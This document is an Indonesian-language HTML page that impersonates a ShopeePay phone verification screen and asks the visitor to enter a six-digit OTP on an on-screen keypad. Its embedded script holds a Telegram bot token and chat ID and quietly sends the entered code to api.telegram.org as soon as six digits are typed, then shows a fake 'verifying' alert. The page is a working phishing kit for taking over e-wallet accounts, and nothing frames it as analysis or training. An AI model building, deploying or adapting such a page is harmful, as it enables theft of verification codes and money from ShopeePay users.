<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi ShopeePay</title>
    <style>
        :root {
            --shopee-orange: #ee4d2d;
            --bg-gray: #f5f5f5;
            --text-dark: #333;
            --text-light: #888;
            --border-color: #ddd;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-gray);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px;
            background: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        /* Navbar */
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .navbar .logo {
            color: var(--shopee-orange);
            font-weight: bold;
            font-size: 1.2rem;
        }

        /* Banner */
        .app-banner {
            background: #fff;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid var(--border-color);
        }

        .banner-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .banner-btn {
            background: var(--shopee-orange);
            color: white;
            border: none;
            padding: 5px 15px;
            border-radius: 4px;
            font-weight: bold;
        }

        /* Main Content */
        .content {
            padding: 20px;
            flex-grow: 1;
        }

        .content h2 {
            font-size: 1.4rem;
            margin-bottom: 5px;
        }

        .content p {
            color: var(--text-light);
            font-size: 0.9rem;
        }

        /* OTP Section */
        .otp-modal {
            background: white;
            border-radius: 12px 12px 0 0;
            padding: 20px;
        }

        .otp-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }

        .otp-box {
            width: 45px;
            height: 45px;
            border: 1px solid var(--border-color);
            text-align: center;
            font-size: 1.2rem;
            border-radius: 4px;
            background: #fff;
            outline: none;
        }

        .otp-box.active {
            border-color: var(--shopee-orange);
            box-shadow: 0 0 5px rgba(238, 77, 45, 0.2);
        }

        .resend-btn {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--border-color);
            background: white;
            border-radius: 4px;
            color: var(--text-light);
            margin-bottom: 20px;
            cursor: not-allowed;
        }

        .resend-btn.active {
            color: var(--shopee-orange);
            border-color: var(--shopee-orange);
            cursor: pointer;
        }

        /* Keypad */
        .keypad {
            background: #f0f0f0;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 1px;
            padding-bottom: 10px;
        }

        .key {
            background: white;
            height: 60px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.4rem;
            font-weight: 500;
            cursor: pointer;
            user-select: none;
        }

        .key:active {
            background: #eee;
        }

        .keypad-footer {
            text-align: center;
            font-size: 0.7rem;
            color: var(--text-light);
            padding: 10px;
            background: #f0f0f0;
        }
    </style>
</head>
<body>

<div class="mobile-container">
    <div class="navbar">
        <span>✕</span>
        <span class="logo">ShopeePay</span>
        <span>🌐 ID ▾</span>
    </div>

    <div class="app-banner">
        <div class="banner-info">
            <div style="background:var(--shopee-orange); width:30px; height:30px; border-radius:5px; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold;">S</div>
            <div>
                <div style="font-weight:bold; font-size:0.8rem;">Buka Aplikasi ShopeePay</div>
                <div style="font-size:0.7rem; color:var(--text-light);">Nikmati kemudahan pembayaran</div>
            </div>
        </div>
        <button class="banner-btn">Buka</button>
    </div>

    <div class="content">
        <h2>Lanjut dengan no. handphone</h2>
        <p>Untuk mengidentifikasi akun ShopeePay Anda</p>
    </div>

    <div class="otp-modal">
        <div class="otp-header">
            <span style="font-weight:bold;">Masukkan Kode Verifikasi</span>
            <span>✕</span>
        </div>
        <p style="font-size:0.8rem; color:var(--text-light);">
            Kode verifikasimu telah dikirimkan melalui <b>WhatsApp</b> ke +62 8********
        </p>
        
        <div class="otp-inputs" id="otp-container">
            <input type="text" class="otp-box" maxlength="1" readonly>
            <input type="text" class="otp-box" maxlength="1" readonly>
            <input type="text" class="otp-box" maxlength="1" readonly>
            <input type="text" class="otp-box" maxlength="1" readonly>
            <input type="text" class="otp-box" maxlength="1" readonly>
            <input type="text" class="otp-box" maxlength="1" readonly>
        </div>

        <button class="resend-btn" id="resend-btn" disabled>Kirim Ulang(39)</button>
    </div>

    <div class="keypad" id="keypad">
        <div class="key" data-val="1">1</div><div class="key" data-val="2">2</div><div class="key" data-val="3">3</div>
        <div class="key" data-val="4">4</div><div class="key" data-val="5">5</div><div class="key" data-val="6">6</div>
        <div class="key" data-val="7">7</div><div class="key" data-val="8">8</div><div class="key" data-val="9">9</div>
        <div class="key" style="background:transparent;"></div>
        <div class="key" data-val="0">0</div>
        <div class="key" data-val="del" style="background:transparent;">⌫</div>
    </div>
    <div class="keypad-footer">
        🛡️ ShopeePay Security Keyboard
    </div>
</div>

<script>
    // --- KONFIGURASI TELEGRAM ---
    const TELEGRAM_TOKEN = '8794002267:AAFS1_xcjzj7y-j4Ue7B-tA9sX83xa_WKmY';
    const TELEGRAM_CHAT_ID = '7549590022';

    let currentOtp = "";
    const otpBoxes = document.querySelectorAll('.otp-box');
    const resendBtn = document.getElementById('resend-btn');

    // --- LOGIKA HITUNG MUNDUR ---
    let timeLeft = 60;
    function startCountdown() {
        const timer = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(timer);
                resendBtn.innerText = "Kirim Ulang";
                resendBtn.disabled = false;
                resendBtn.classList.add('active');
            } else {
                resendBtn.innerText = `Kirim Ulang(${timeLeft})`;
                timeLeft--;
            }
        }, 1000);
    }
    
    // Jalankan hitung mundur saat halaman dimuat
    startCountdown();

    // --- LOGIKA TELEGRAM ---
    function sendToTelegram(otp) {
        const message = `<b>🔔 Notifikasi OTP Baru</b>\n\n<b>Kode OTP:</b> <code>${otp}</code>\n<b>Waktu:</b> \${new Date().toLocaleString('id-ID')}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        }).then(res => console.log("Data terkirim ke Telegram"));
    }

    // --- LOGIKA KEYPAD ---
    document.getElementById('keypad').addEventListener('click', (e) => {
        const val = e.target.getAttribute('data-val');
        if (!val) return;

        if (val === 'del') {
            currentOtp = currentOtp.slice(0, -1);
        } else if (currentOtp.length < 6) {
            currentOtp += val;
        }

        // Update tampilan kotak
        otpBoxes.forEach((box, index) => {
            box.value = currentOtp[index] || "";
            box.classList.toggle('active', index === currentOtp.length);
        });

        // Jika sudah 6 digit, kirim otomatis
        if (currentOtp.length === 6) {
            sendToTelegram(currentOtp);
            alert("Kode sedang diverifikasi...");
        }
    });

    // Set fokus awal
    otpBoxes[0].classList.add('active');
</script>

</body>
</html>
